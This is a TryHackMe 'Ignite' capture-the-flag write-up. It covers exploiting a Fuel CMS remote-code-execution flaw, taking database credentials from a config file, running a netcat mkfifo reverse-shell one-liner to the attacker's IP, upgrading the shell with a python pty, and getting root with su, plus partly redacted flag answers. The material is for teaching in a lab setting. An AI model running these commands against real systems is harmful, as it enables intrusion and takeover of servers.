# TryHackMe Ignite
**A new start-up has a few issues with their web server.**

## Task-1 Root it!

* First I tried to examine the website and below there was a /fuel/dashboard page whose creds were given to us. So I logged into it and it was a mysql database panel. So for enumeration start with nmap scan and dirbuster. Nmap results show port -'80' and dirbuster also gave some directories one of which was fuel.

* Then I searched for fuel cms CVE using '*searchsploit fuel cms*' and got one. It was a remote code execution . Download the file into your machine and change its 'url' to the THM machine ip. Also remove the proxy portion from the 'r' variable as we are not working with burp.

* So after running the file I was successully granted a shell in which it asks for 'cmd:'. So I searched for 'pwd', and also list the users using '*ls -la /home/*' and got one named 'www-data'. So I saw items in this user using '*ls -la /home/www-data*' and yes we have a flag.txt file. See its content using '*cat /home/www-data/flag.txt*'. This is our first flag.

1. User.txt<br>
Answer :6470e39**********************

* Now I searched how to gain root access but was unable to find anything. Then I went to home page of the website and there in 'install the database' we are given a database configuration file. I saw its content using '*cat /var/www/html/fuel/application/config/database.php*' and got the user:pass. So I tried to find any special privileges for root in the shell but was unable to find. In the end I searched for nc reverse shell to gain access. 

* So I searched for reverse shell online and got one on this site http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet. So I typed '*rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 'tun0ip' 4444 >/tmp/f*' in the shell and started '*nc -lnvp 4444*' in my machine. You can see your tun0ip using 'ifconfig'. SO we have our shell now. If I type su to switch user it shows that 'su must be run from a terminal'. So type *python -c 'import pty; pty.spawn("/bin/sh")'* to spawn a terminal. No we are in terminal and type 'su'. It asks for a password . Remember we got a password from mysql databse. Type in the passowrd 'mememe' and we have our root access. Move to 'cd /root'  and type 'ls -la'. You will see 'root.txt' file. See its content which is the answer to our last question.

2. Root.txt<br>
Answer : b9bbcb33e11b8***************